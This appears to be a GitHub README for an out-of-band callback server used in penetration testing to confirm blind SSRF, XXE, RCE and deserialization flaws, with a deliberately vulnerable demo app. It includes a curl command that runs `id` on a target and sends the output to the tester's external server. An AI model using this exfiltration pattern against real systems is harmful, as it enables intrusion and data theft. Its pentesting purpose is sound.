# OOB Server for blind vulns
* Reference:

  https://notsosecure.com/out-band-exploitation-oob-cheatsheet
  
* Perfect OOB server project:

  https://github.com/projectdiscovery/interactsh
```
USAGE:

[+] ON OOB SERVER (10.0.0.10)
SHELL$ wget https://github.com/projectdiscovery/interactsh/releases/download/v1.1.9/interactsh-client_1.1.9_linux_amd64.zip

SHELL$ cat oob.sh
./interactsh-client -s oast.me -ps  &
python3 -m http.server 8888

SHELL$ chmod a+x oob.sh;./oob.sh

[+] ON CLIENT (Test Machine)
SHELL$ curl 10.0.0.10:8888/interactsh_payload.txt
cntge6do4021ee5lcht0mnz1zbyh4zsnj.oast.me

THE PAYLOAD LINK 'cntge6do4021ee5lcht0mnz1zbyh4zsnj.oast.me',
can be use as blind payload, such as SSRF/XXE/RCE/Deserialization

```

----
# FOR THIS TOOL
## How to use?
## server.py
1. change HOST and PORT to your own OOB server's IP address and listen port.
2. start up the OOB server:
```bash
shell$ python3 server.py
```

### Simple Validation:
  
when client to access:
```
http://oob_server:port/geturl
```
the OOB server will generate and response a random URL like:
```
http://oob_server:port/iF9d2k
```
when client to access this random URL, it will create a txt file and logging client's IP.\
and client can access `random_url?m=1` to check this
```
http://oob_server:port/iF9d2k?m=1
```

![image](https://github.com/NinjaGPT/oob_server/assets/4035112/c1880071-2ccb-4d70-ad39-fa649ec9cb34)

### Record Execution Result:
  
when pentester wants to gain the executed result of OS command, can send:
```
curl http://oob_server:port/`id`
```
and then to access following URL to get result:
```
http://oob_server:port/checklog
```
![image](https://github.com/NinjaGPT/oob_server/assets/4035112/14d1c6a4-bfbb-4ef3-b10d-afa074a9ea6a)

## victim.py
a demo of vulnerable Web application.
```
http://victim.com:port/vuln
POST
cmd={command}
```
<img width="633" alt="image" src="https://github.com/NinjaGPT/oob_server/assets/4035112/b1cf3229-c818-4dec-bacc-a948a0bec62b">

## poc.py
Simple Validation POC

![image](https://github.com/NinjaGPT/oob_server/assets/4035112/6f5f7cee-b56d-4b93-9ade-dcb2d5c481f6)


## response_poc.py
Gain Execution Result POC

![image](https://github.com/NinjaGPT/oob_server/assets/4035112/245b8e28-1587-4821-b11b-4efed3d1a78f)
